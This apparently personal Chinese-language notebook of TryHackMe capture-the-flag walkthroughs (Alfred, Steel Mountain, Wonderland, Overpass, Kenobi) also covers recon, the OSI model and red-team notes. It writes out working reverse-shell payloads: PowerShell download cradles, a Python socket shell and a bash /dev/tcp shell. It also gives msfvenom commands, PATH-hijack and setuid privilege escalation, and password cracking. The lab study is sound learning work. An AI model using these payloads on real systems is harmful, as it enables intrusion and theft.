# THM

[toc]



## Machine

### Services
#### user

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230508191642.png)

直接80端口+dirbuster扫目录,一无所获

![image.png|600](https://gitee.com/leiye87/typora_picture/raw/master/20230508193456.png)

可利用端口
- 80 IIS 10.0 
- 88 kerberos 
- 389 ldap 服务
- 3389 rdp
- 5985 WInRm
`smbclient //10.10.109.31/anonymous` 试下smb匿名登录



### Alfred

#### user

![image-20230423225328805](https://gitee.com/leiye87/typora_picture/raw/master/20230423225331.png)

没连vpn,不知道把学校哪个服务器扫了

![image-20230423230116938](https://gitee.com/leiye87/typora_picture/raw/master/20230423230118.png)

访问8080端口,提示我们存在命令执行,在script目录下可以执行 `Groovy script` 搜索发现是java类的,但是无法命令执行

在project 下存在命令执行,由于是window,需要使用powershell反弹shell,下载我们的shell 后执行

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.20.202/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.20.202 4444 your-port
```

![image-20230424001349327](https://gitee.com/leiye87/typora_picture/raw/master/20230424001350.png)

#### switch shell

为了提权更加容易,将shell转变为msfshell

生成reverse_shell

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=115.236.153.174 LPORT=16806 -f exe -o shell.exe
```

下载shell并执行

```
powershell "(New-Object System.Net.WebClient).Downloadfile('https://efc4-183-134-99-166.ngrok-free.app/shell.exe','shell.exe')"
//在之前的shell上执行
Start-Process "shell.exe"
```


```python
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 115.236.153.174 -p 16806 -e cmd
```
msf本地监听

```shell
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
```

#### root

>   Window使用令牌来确保账户具有执行特定操作的适当权限. 账户令牌在用户登录或进行身份验证时分配给账户.一般有LSASS.exe完成
>
>   有两种类型的访问令牌：
>
>   -   主访问令牌：与登录时生成的用户帐户关联的令牌
>   -   模拟令牌：这些令牌允许特定进程（或进程中的线程）使用另一个（用户/客户端）进程的令牌访问资源
>
>   帐户的权限（在创建帐户时授予帐户或从组继承）允许用户执行特定操作。以下是最常被滥用的特权：
>
>   -   SeImpersonatePrivilege
>   -   SeAssignPrimaryPrivilege
>   -   SeTcbPrivilege
>   -   SeBackupPrivilege
>   -   SeRestorePrivilege
>   -   SeCreateTokenPrivilege
>   -   SeLoadDriverPrivilege
>   -   SeTakeOwnershipPrivilege
>   -   SeDebugPrivilege

```powershell
//查找所有特权
whoami /priv | Select-String -Pattern "enabled"
```

![image-20230424005811186](https://gitee.com/leiye87/typora_picture/raw/master/20230424005812.png)

```shell
//加载隐身模块
load incognito
```

`查看可用令牌`

![image-20230424010132029](https://gitee.com/leiye87/typora_picture/raw/master/20230424010133.png)

```
//模拟令牌
impersonate_token "BUILTIN\Administrators"
//输入getuid
//输出  NT AUTHORITY\SYSTEM
```

我们现在已经拥有了最高权限的令牌,但实际上我们也可能没有特权用户的权限.这是由于Windows处理权限的方式-它使用进程的主令牌而不是模拟令牌来确定进程可以做什么或不能做什么.services.exe 是一个系统服务进程,具有与其他进程通信的权限

```
//迁移进程,最安全的进程为services.exe
//ps 查看services.exe的进程
migrate 668

```



### Steel Mountain

Window 

#### user

nmap 运行着 HFS 服务，搜索到相关CVE,msf一把梭

```
search 2014-6287
set xx
run
```

查看 `flag`  

```
cat C:\\Users\bill\Desktop\user.txt
```

`shell` 可以切换 msfshell 和powershell

#### root

上传文件检测提权利用点

```
upload /opt/powerUp.ps1
load powershell  //加载powershell
powershell_shell //进入powershell
. .\PowerUp.ps1 //执行我们刚刚下载的脚本
Invoke-AllChecks //Invoke-AllChecks 是一个运行模块中包含的所有检查的函数。该函数以有用的格式输出检查结果，并为我们提供有关在哪里查看权限提升的建议。我们收到了检查结果列表并建议了可能的 PowerUp 攻击

```

![image-20230422220248580](https://gitee.com/leiye87/typora_picture/raw/master/20230422220251.png)

所以我们可以利用这个服务，上传恶意文件后重新启动服务

```
cd 'C:\\Program\ Files\ (x86)\\IObit\\'

//生成反弹shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.20.202 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
//上传
upload ~/Advanced.exe
// local listen
use multi/handler 
set lhost 10.4.20.202
set LPORT 4443
run
//restart server
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
成功
```

![image-20230422220856614](https://gitee.com/leiye87/typora_picture/raw/master/20230422220857.png)

### Wonderland

#### user

nmap 22 80

递归扫描目录,真逆天这

```
http://<ip>/a/b/b/i/t
```

源码中存在alice用户的ssh密码

需要横向到rabbit用户，sudo -l

![image-20230421225523107](https://gitee.com/leiye87/typora_picture/raw/master/20230421225525.png)

由于这个文件导入了random,而python会优先使用当前目录下的文件,新建一个 random.py

```py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.4.20.202",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

运行 

```shell
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

 ![image-20230421231138472](https://gitee.com/leiye87/typora_picture/raw/master/20230421231139.png)

已知 teaParty 使用了date命令,环境变量劫持

```
#/tmp/date
echo "/bin/bash" >/tmp/date
chmod 777 date
export PATH=/tmp:$PATH
./teaParty
```

![image-20230421233850295](https://gitee.com/leiye87/typora_picture/raw/master/20230421233851.png)

hatter 用户目录下存在password 换成ssh

#### Root
>   `getcap -r / 2>/dev/null` 是一个 Linux 命令，用于列出整个文件系统中具有扩展属性（Extended Attributes）的文件和目录，并将错误输出重定向到 `/dev/null` 设备，以避免显示不必要的错误信息。

![image-20230421235947409](https://gitee.com/leiye87/typora_picture/raw/master/20230421235948.png)

```
 /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

GTOBins 提到了

[perl | GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities)

>   ## Capabilities
>
>   If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
>
>   -   ```
>       cp $(which perl) .
>       sudo setcap cap_setuid+ep perl
>                       
>       ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
>       ```



### Overpass

#### user

nmap 22 80

目录扫描扫到admin，发现只需要cookie里增加 `SessionToken`即可

admin界面存在james用户私钥

```bash
python /usr/share/john/ssh2john.py id_rsa >id_rsa.hash

john --wordlists=/usr/share/wordlists/rockyou.txt
```



#### root

定时任务提权

![image-20230420201458994](https://gitee.com/leiye87/typora_picture/raw/master/20230420201500.png)

伪造hosts文件，变为我们的服务器

写入文件

```
bash -c 'exec bash -i &>/dev/tcp/10.18.112.117/4444 <&1'
```

kali `nc -lvnp 4444`

### RootMe

#### user

![image-20230418002809525](https://gitee.com/leiye87/typora_picture/raw/master/20230418002812.png)

dirbuster扫描http目录



### Basic Pentesting

#### user

dirbuster 枚举目录

enum4linux枚举 用户名

```
enum4linux <IP>
```

hydra 破解密码

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh
```

### Kenobi

* 枚举SMB共享
* 挂载远程

#### user

> Samba是用于linux和unix标准的windows互联网程序套件.它允许最终用户访问和使用公司内联网或互联网上的文件,打印机和其他共享资源.它通常被称为网络文件系统
>
> Samba 基于服务器消息块 (SMB) 的通用客户端/服务器协议。SMB 仅针对 Windows 开发，如果没有 Samba，其他计算机平台将与 Windows 机器隔离，即使它们属于同一网络。

使用nmap为SMB共享枚举

```shell
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.70.225
```

```shell
#以匿名用户连接
smbclient //10.10.70.225/anonymous
#连接后使用dir命令查看共享文件

#递归下载文件，不需要用户名和密码

smbget -R smb://10.10.70.225/anonymous
```

查看log.txt

发现了 `ProFTPD` 服务器信息，版本为1.3.5

> [
> 您应该已经从 ProFtpd 的mod_copy 模块](http://www.proftpd.org/docs/contrib/mod_copy.html)中找到了一个漏洞。 
>
> mod_copy 模块实现了**SITE CPFR**和**SITE CPTO**命令，可用于将文件/目录从服务器上的一个地方复制到另一个地方。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制 到选定的目的地。

> 您之前的 nmap 端口扫描将显示运行服务 rpcbind 的端口 111。这只是一个将远程过程调用 (RPC) 程序编号转换为通用地址的服务器。当一个 RPC 服务启动时，它告诉 rpcbind 它正在监听的地址和它准备服务的 RPC 程序号。 

> 在我们的例子中，端口 111 用于访问网络文件系统。让我们使用 nmap 来枚举它。
> 
>```shell
> nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.70.225
>```

```
#连接FTP服务器
nc 10.10.70.225 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

```

挂载目录 /var/tmp

```
mkdir /mnt/kenobiNFS
mount 10.10.70.225:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

获取私钥

```
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.70.225
```



d0b0f3f53b6caa532a83915e19224899

#### root

提权还是比较容易的，环境变量劫持

* SUID
*  `find / -perm -u=s -type f 2>/dev/null`

发现存在一个 `menu` 命令，运行一下，有三个选项

```
# strings 命令查看二进制文件的字符串
strings /usr/bin/menu
```

发现调用了`curl` 命令

* ```shell
  cd /tmp
  echo "/bin/sh">curl
  chmod 777 curl
  export PATH=/tmp:$PATH
  /usr/bin/menu
  ```

拿到root

177b3cd8562289f37382721c28381f02



## Jr Penetration Tester

### 子域名

* [crt.sh](https://crt.sh/)  证书颁发机构创建的ssl证书

* google 

  ```
  site:*domain.com
  ```

* brute force

* ```
  sublist3r.py -d acmeitsupport.thm
  ```

* 虚拟主机 

  ```
  ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.213.172
  ```

### Authentication Bypass

简单的ffuf使用

```shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.51.50/customers/signup -mr "username already exists"
```

### IDOR

Insecure Direct Object Reference 不安全的直接对象引用

可以简单理解为水平未授权访问

### file include

### vulnerabilities101

### SSRF

云服务器中  169.254.169.254 ip保存重要信息

学到了，原来更新用户头像也能存在ssrf

## OSI (open systems interconnection)

### 七-应用层(Application)

离用户最近的一层,包括浏览器,图形化界面

### 六-表示层(Presentation)

负责数据格式转换.加密解密

### 五-会话层(Session)

当表示层正确转换或格式化数据,会话层将开始创建与数据目的地的另一台计算机的连接

会话层将开始将发送的数据分成更小的数据块，并开始一次一个地发送这些数据块

### 四-传输层(Transport)

主要有两种协议

* TCP (Transmission Control Protocol)

  | **TCP的优点  **                        | **TCP的缺点 **                                               |
  | -------------------------------------- | ------------------------------------------------------------ |
  | 保证数据的准确性。                     | 需要两个设备之间的可靠连接。如果没有收到一小块数据，则无法使用整个数据块。 |
  | 能够同步两个设备以防止彼此被数据淹没。 | 慢速连接可能会阻碍另一台设备，因为连接将一直保留在接收计算机上。 |
  | 为可靠性执行更多的过程。               | TCP比 UDP 慢得多，因为使用此协议的设备必须完成更多工作。     |

* UDP(User Datagram Protocol)

  | **UDP的优点**                                             | **UDP的缺点**                                      |
  | --------------------------------------------------------- | -------------------------------------------------- |
  | UDP比 TCP 快得多。                                        | UDP不关心是否收到数据。                            |
  | UDP让应用层（用户软件）决定是否可以控制数据包的发送速度。 | 从这个意义上说，它对软件开发人员来说是相当灵活的。 |
  | UDP不像 TCP 那样在设备上保留连续连接。                    | 这意味着不稳定的连接会给用户带来糟糕的体验。       |

### 三-网络层(Network)

将数据包从源主机到目标主机,寻找合适的路径和路由选择

这一层处理IP地址

### 二-数据链路层(Data link)

侧重于物理寻址.从网络层接受数据包,并添加接收端点的MAC地址

### 一-物理层(Physical)

硬件设备

## RedTeam

### 防火墙绕过

| 规避方法                        | Nmap 参数                                 |
| ------------------------------- | ----------------------------------------- |
| 使用诱饵隐藏扫描                | `-D DECOY1_IP1,DECOY_IP2,ME`              |
| 使用随机诱饵隐藏扫描            | `-D RND,RND,ME`                           |
| 使用 HTTP/SOCKS4 代理来中继连接 | `--proxies PROXY_URL`                     |
| 欺骗源MAC地址                   | `--spoof-mac MAC_ADDRESS`                 |
| 欺骗源IP地址                    | `-S IP_ADDRESS`                           |
| 使用特定的源端口号              | `-g PORT_NUM`或者`--source-port PORT_NUM` |

### Recon
#### Passive
| 用途     | 语法                           |
| -------- | ------------------------------ |
| 文件泄露 | intitle:"index of" "nginx.log" |
| 敏感目录 | inurl:/certs/server.key        |
|          |                                |
好几款开源工具,这怎么学的来
##### Maltego
### weaponization
*制作payload*
```shell
msfvenom 
```
### Password Attacks
Here are some website lists that provide default passwords for various products.

- https://cirt.net/passwords
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

#### Combined wordlists  

```shell
cat file1.txt file2.txt file3.txt > combined_list.txt
```

去重&排序

```shell
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

### Post Compromise

